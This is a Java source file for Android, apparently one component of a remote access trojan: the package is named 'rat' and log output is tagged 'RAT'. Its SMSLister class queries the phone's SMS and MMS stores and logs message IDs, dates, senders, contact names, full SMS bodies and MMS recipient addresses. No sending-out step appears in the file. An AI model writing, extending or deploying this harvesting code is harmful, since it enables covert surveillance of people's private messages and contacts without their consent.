package com.score.rat.Library;

import android.database.Cursor;
import android.net.Uri;
import android.provider.Telephony;
import android.util.Log;

import com.score.rat.MainActivity;

public class SMSLister {

    public static boolean listSms(MainActivity m){
        boolean ret = false;
        String[] columns = { "*" };//"_id", "type", "date", "duration", "number","name" };
        String SORT_ORDER = "date DESC";
        Cursor cursor = m.getContentResolver().query(Telephony.Sms.CONTENT_URI, columns, null, null, SORT_ORDER);
        for (String column : cursor.getColumnNames()) {
            Log.v("RAT", column);
        }
        if(cursor.getCount() != 0) {
            cursor.moveToFirst();
            Log.d("RAT","SMSLog");
            do{
                if(cursor.getColumnCount() != 0) {
                    int id = cursor.getInt(cursor.getColumnIndex("_id"));
                    int type = cursor.getInt(cursor.getColumnIndex("type"));
                    long date = cursor.getLong(cursor.getColumnIndex("date"));
                    int thread_id = cursor.getInt(cursor.getColumnIndex("thread_id"));
                    String number  = cursor.getString(cursor.getColumnIndex("address"));
                    String name = cursor.getString(cursor.getColumnIndex("person"));
                    String body = cursor.getString(cursor.getColumnIndex("body"));
                    //int raw_contact_id = cursor.getInt(cursor.getColumnIndex("raw_contact_id"));
                    Log.d("RAT","SMS: " + id + " " + type + " " + date + " " + thread_id + " " + number + " " + name + " " + body);

                }
            }while(cursor.moveToNext());
            ret = true;
        }
        else
            ret = false;
        return ret;
    }

    public static boolean listMms(MainActivity m){
        boolean ret = false;
        String[] columns = { "*" };//"_id", "type", "date", "duration", "number","name" };
        String SORT_ORDER = "date DESC";
        Cursor cursor = m.getContentResolver().query(Telephony.Mms.CONTENT_URI, columns, null, null, SORT_ORDER);
        for (String column : cursor.getColumnNames()) {
            Log.v("RAT", column);
        }
        if(cursor.getCount() != 0) {
            cursor.moveToFirst();
            Log.d("RAT","MMSLog");
            do{
                if(cursor.getColumnCount() != 0) {
                    int id = cursor.getInt(cursor.getColumnIndex("_id"));
                    int type = cursor.getInt(cursor.getColumnIndex("m_type"));
                    long date = cursor.getLong(cursor.getColumnIndex("date"));
                    int thread_id = cursor.getInt(cursor.getColumnIndex("thread_id"));
                    //int raw_contact_id = cursor.getInt(cursor.getColumnIndex("raw_contact_id"));
                    Log.d("RAT","MMS: " + id + " " + type + " " + date + " " + thread_id );
                    Uri addrUri = Uri.parse("content://mms/" + id + "/addr");
                    Cursor addCursor = m.getContentResolver().query(addrUri, columns, null, null, null);
                    for (String column : addCursor.getColumnNames()) {
                        Log.v("RAT", column);
                    }
                    if(addCursor.getCount() != 0) {
                        addCursor.moveToFirst();
                        do {
                            if (addCursor.getColumnCount() != 0) {
                                String address = addCursor.getString(addCursor.getColumnIndex("address"));
                                int addType = addCursor.getInt(addCursor.getColumnIndex("type"));
                                Log.d("RAT", "address: " + address + " " + addType);
                            } else {
                                Log.d("RAT", "No address");
                            }
                        } while (addCursor.moveToNext());
                    } else {
                        Log.d("RAT", "No recipients");
                    }
                }
            }while(cursor.moveToNext());
            ret = true;
        }
        else
            ret = false;
        return ret;
    }
}
